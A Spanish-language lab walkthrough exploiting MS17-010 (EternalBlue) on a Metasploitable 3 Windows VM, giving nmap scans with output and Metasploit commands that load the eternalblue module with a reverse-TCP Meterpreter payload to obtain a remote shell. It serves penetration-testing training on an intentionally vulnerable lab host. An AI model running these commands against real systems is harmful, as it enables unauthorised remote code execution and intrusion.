# Explotación de Vulnerabilidad MS17-10

TARGET: 192.168.153.181 (METASPLOITABLE 3 WINDOWS)

##  Enumeración de servicios

Ejecutamos nmap
```
nmap -A -p- -T4 -oN metasploitable3.txt 192.168.153.181
```
Estos son los resultados

```
# Nmap 7.91 scan initiated Sat May 29 15:18:59 2021 as: nmap -A -p- -T4 -oN metasploitable3.txt 192.168.153.181
Nmap scan report for 192.168.153.175
Host is up (0.00038s latency).
Not shown: 65486 closed ports
PORT      STATE SERVICE              VERSION
22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 7e:01:95:19:f7:98:60:5e:b0:98:48:15:b1:3a:40:62 (RSA)
|_  521 6b:82:11:ef:19:fb:f3:05:36:53:42:a2:92:c9:bb:9c (ECDSA)
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds         Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
1617/tcp  open  java-rmi             Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @192.168.153.175:49156
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
3000/tcp  open  http                 WEBrick httpd 1.3.1 (Ruby 2.3.3 (2016-11-21))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: WEBrick/1.3.1 (Ruby/2.3.3/2016-11-21)
|_http-title: Ruby on Rails: Welcome aboard
3306/tcp  open  mysql                MySQL 5.5.20-log
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=vagrant-2008R2
| Not valid before: 2021-04-26T02:58:15
|_Not valid after:  2021-10-26T02:58:15
|_ssl-date: 2021-05-29T19:22:47+00:00; 0s from scanner time.
3700/tcp  open  giop                 CORBA naming service
3820/tcp  open  ssl/scp?
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
|_ssl-date: 2021-05-29T19:22:47+00:00; 0s from scanner time.
3920/tcp  open  ssl/exasoftport1?
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
|_ssl-date: 2021-05-29T19:22:47+00:00; -1s from scanner time.
4848/tcp  open  ssl/appserv-http?
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
|_ssl-date: 2021-05-29T19:22:48+00:00; 0s from scanner time.
5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7676/tcp  open  java-message-service Java Message Service 301
8009/tcp  open  ajp13                Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8019/tcp  open  qbdb?
8020/tcp  open  http                 Apache httpd
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html;charset=UTF-8).
8022/tcp  open  http                 Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Site doesn't have a title (text/html;charset=UTF-8).
8027/tcp  open  unknown
8028/tcp  open  postgresql           PostgreSQL DB
8031/tcp  open  ssl/unknown
8032/tcp  open  desktop-central      ManageEngine Desktop Central DesktopCentralServer
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: GlassFish Server Open Source Edition  4.0 
|_http-title: GlassFish Server - Server Running
8181/tcp  open  ssl/intermapper?
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
|_ssl-date: 2021-05-29T19:22:48+00:00; 0s from scanner time.
8282/tcp  open  http                 Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/8.0.33
8383/tcp  open  ssl/http             Apache httpd
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html;charset=UTF-8).
| ssl-cert: Subject: commonName=Desktop Central/organizationName=Zoho Corporation/stateOrProvinceName=CA/countryName=US
| Not valid before: 2010-09-08T12:24:44
|_Not valid after:  2020-09-05T12:24:44
|_ssl-date: TLS randomness does not represent time
8443/tcp  open  ssl/https-alt?
8444/tcp  open  desktop-central      ManageEngine Desktop Central DesktopCentralServer
8484/tcp  open  http                 Jetty winstone-2.8
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(winstone-2.8)
|_http-title: Dashboard [Jenkins]
8585/tcp  open  http                 Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
|_http-server-header: Apache/2.2.21 (Win64) PHP/5.3.10 DAV/2
|_http-title: WAMPSERVER Homepage
8686/tcp  open  java-rmi             Java RMI
| rmi-dumpregistry: 
|   vagrant-2008R2.localdomain/7676/jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @192.168.153.175:49327
|     extends
|       java.rmi.server.RemoteStub
|       extends
|         java.rmi.server.RemoteObject
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @192.168.153.175:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
9200/tcp  open  wap-wsp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=UTF-8
|     Content-Length: 80
|     handler found for uri [/nice%20ports%2C/Tri%6Eity.txt%2ebak] and method [GET]
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json; charset=UTF-8
|     Content-Length: 305
|     "status" : 200,
|     "name" : "Beast",
|     "version" : {
|     "number" : "1.1.1",
|     "build_hash" : "f1585f096d3f3985e73456debdc1a0745f512bbc",
|     "build_timestamp" : "2014-04-16T14:27:12Z",
|     "build_snapshot" : false,
|     "lucene_version" : "4.7"
|     "tagline" : "You Know, for Search"
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; charset=UTF-8
|     Content-Length: 0
|   RTSPRequest, SIPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain; charset=UTF-8
|_    Content-Length: 0
9300/tcp  open  vrace?
47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc                Microsoft Windows RPC
49153/tcp open  msrpc                Microsoft Windows RPC
49154/tcp open  msrpc                Microsoft Windows RPC
49155/tcp open  msrpc                Microsoft Windows RPC
49156/tcp open  java-rmi             Java RMI
49157/tcp open  tcpwrapped
49158/tcp open  msrpc                Microsoft Windows RPC
49167/tcp open  msrpc                Microsoft Windows RPC
49176/tcp open  unknown
49268/tcp open  ssh                  Apache Mina sshd 0.8.0 (protocol 2.0)
49269/tcp open  jenkins-listener     Jenkins TcpSlaveAgentListener
49327/tcp open  java-rmi             Java RMI
49330/tcp open  unknown
49331/tcp open  unknown
49332/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9200-TCP:V=7.91%I=7%D=5/29%Time=60B293D0%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,188,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application/js
SF:on;\x20charset=UTF-8\r\nContent-Length:\x20305\r\n\r\n{\r\n\x20\x20\"st
SF:atus\"\x20:\x20200,\r\n\x20\x20\"name\"\x20:\x20\"Beast\",\r\n\x20\x20\
SF:"version\"\x20:\x20{\r\n\x20\x20\x20\x20\"number\"\x20:\x20\"1\.1\.1\",
SF:\r\n\x20\x20\x20\x20\"build_hash\"\x20:\x20\"f1585f096d3f3985e73456debd
SF:c1a0745f512bbc\",\r\n\x20\x20\x20\x20\"build_timestamp\"\x20:\x20\"2014
SF:-04-16T14:27:12Z\",\r\n\x20\x20\x20\x20\"build_snapshot\"\x20:\x20false
SF:,\r\n\x20\x20\x20\x20\"lucene_version\"\x20:\x20\"4\.7\"\r\n\x20\x20},\
SF:r\n\x20\x20\"tagline\"\x20:\x20\"You\x20Know,\x20for\x20Search\"\r\n}\n
SF:")%r(HTTPOptions,4F,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,4
SF:F,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20charset=UT
SF:F-8\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,A9,"HTTP/1\.0
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=UT
SF:F-8\r\nContent-Length:\x2080\r\n\r\nNo\x20handler\x20found\x20for\x20ur
SF:i\x20\[/nice%20ports%2C/Tri%6Eity\.txt%2ebak\]\x20and\x20method\x20\[GE
SF:T\]")%r(SIPOptions,4F,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/
SF:plain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n");
MAC Address: 00:0C:29:9C:48:7B (VMware)
Device type: general purpose
Running: Microsoft Windows 7
OS CPE: cpe:/o:microsoft:windows_7::sp1
OS details: Microsoft Windows 7 SP1
Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; Device: remote management; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 52m29s, deviation: 2h28m29s, median: 0s
|_nbstat: NetBIOS name: VAGRANT-2008R2, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:9c:48:7b (VMware)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: vagrant-2008R2
|   NetBIOS computer name: VAGRANT-2008R2\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-29T12:22:11-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-29T19:22:17
|_  start_date: 2021-05-29T19:02:49

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 192.168.153.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 29 15:23:03 2021 -- 1 IP address (1 host up) scanned in 244.02 seconds
```

## Detectar la vulnerabilidad

Ahora concentremonos en solo el puerto 445

```
nmap -O -f -sS -sV -p445 --script 'default,vuln' -oA 192.168.153.181_vuln 192.168.153.181
```
Los resultados son los siguientes
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 15:20 EDT
Nmap scan report for 192.168.153.181
Host is up (0.0011s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
MAC Address: 00:0C:29:9C:48:7B (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h44m59s, deviation: 3h30m00s, median: 0s
|_nbstat: NetBIOS name: VAGRANT-2008R2, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:9c:48:7b (VMware)
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: vagrant-2008R2
|   NetBIOS computer name: VAGRANT-2008R2\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-07T12:20:38-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-07T19:20:37
|_  start_date: 2021-06-07T19:14:39
```

![image](https://user-images.githubusercontent.com/50930193/121077794-aeb7b500-c79d-11eb-8558-fbb4e25eee80.png)

Esta vulnerabilidad explota la vulnerabilidad ms17-010 en sistema operativo windows que ataca el protocolo SMBv1 que operaba bajo el puerto 445.

## 1. Detección de Vulnerabilidad con Metasploit

Ingresa a metasploit
```
msfconsole 
```
Este comando permite ingresar a la consola de metasploit
```

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.0.45-dev                          ]
+ -- --=[ 2134 exploits - 1139 auxiliary - 364 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command

msf6 > Interrupt: use the 'exit' command to quit
msf6 > 
```
Opcionalmente para una entrada mas rápida puedes ingresar con este comando
```
msfconsole -q
```

Como se mencionó lineas arriba la vulnerabilidad que vamos a explotar es la MS17-010, metasploit considera siempre estos parámetros:

1. LHOST que corresponde a la máquina del atacante Local Host o Ip Local
2. RHOST que corresponde a la máquina del target que tiene la vulnerabilidad
3. LPORT que corresponde al puerto a explotar 

![image](https://user-images.githubusercontent.com/50930193/121088334-335d0000-c7ab-11eb-845e-d568ed7b1b46.png)


El primer paso es ubicar un módulo que permita validar si el servicio es vulnerable
```
search ms17
```
![image](https://user-images.githubusercontent.com/50930193/121089089-3b696f80-c7ac-11eb-945d-6f8f13081ac2.png)

ahora podemos usar el comando que carga el módulo de scanner
```
use auxiliary/scanner/smb/smb_ms17_010
```
![image](https://user-images.githubusercontent.com/50930193/121089143-51773000-c7ac-11eb-8b4a-64ff644a7690.png)

Establecer el valor RHOST, allí se debería incluir el IP del Target
```
set RHOSTS 192.168.153.181
```
![image](https://user-images.githubusercontent.com/50930193/121089224-72d81c00-c7ac-11eb-9c47-a32fa58313c6.png)

Corremos el scnaer y nos cercioramos que el target es vulnerable

```
run
```
![image](https://user-images.githubusercontent.com/50930193/121089320-969b6200-c7ac-11eb-81b0-4f44522b9713.png)

## Explotación de Vulnerabilidad con Metasploit

Ubicar el módulo de exploit a utilizar, para ello, es necesario que podamos al igual que en el caso anterior ubiquemos el exploita a utilizar

![image](https://user-images.githubusercontent.com/50930193/121092507-44a90b00-c7b1-11eb-9580-dbe088f82da8.png)

ahora podemos usar el comando que carga el módulo de exploit
```
use exploit/windows/smb/ms17_010_eternalblue
```

![image](https://user-images.githubusercontent.com/50930193/121093461-ae75e480-c7b2-11eb-901f-afe0e36520a3.png)

Si bien el resultado da cuenta de que se está usando un payload, se recomienda seterarlo
```
set payload windows/x64/meterpreter/reverse_tcp
```
Revise que parámetros son necesarios incluir en este payload
```
show options
```
![image](https://user-images.githubusercontent.com/50930193/121093956-70c58b80-c7b3-11eb-843e-130492e04f80.png)

Considere los parámetros no opcionales, si no encontrara los parametros llenos seteelos de la siguiente manera:

```
set RHOSTS  192.168.153.181
set LHOST 192.168.153.178
set RPORT 445

```
![image](https://user-images.githubusercontent.com/50930193/121094262-f77a6880-c7b3-11eb-9409-876f4306ab3c.png)

Ahora que tiene todos los parametros llenos, lance el exploit
```
exploit

```

![image](https://user-images.githubusercontent.com/50930193/121094614-89827100-c7b4-11eb-9052-fcfd12e354a3.png)

Como verán se obtiene una shell con acceso al sistema operativo
